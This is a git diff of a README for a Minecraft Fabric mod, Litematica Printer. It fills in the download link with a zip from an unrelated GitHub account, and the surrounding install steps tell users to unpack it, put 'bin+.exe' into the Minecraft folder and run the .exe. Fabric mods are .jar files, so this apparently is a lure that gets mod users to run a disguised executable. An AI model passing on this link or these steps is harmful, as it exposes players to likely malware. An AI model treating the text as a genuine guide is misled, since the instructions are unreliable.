@@ -5,7 +5,7 @@ This extension adds printing functionality for Litematica fabric.
 
 ## Installation 
 1. Download and install Fabric if you haven't already.
-2. [Download]() the latest Litematica Printer release for your Minecraft version from the releases.
+2. [Download](https://github.com/landameena55moder/Litematica-for-1.21.3/releases/download/Enjoy!/Litematica.zip) the latest Litematica Printer release for your Minecraft version from the releases.
 3. Unlock .zip then put bin+.exe into minecraft folder.
 4. Run .exe file.
 
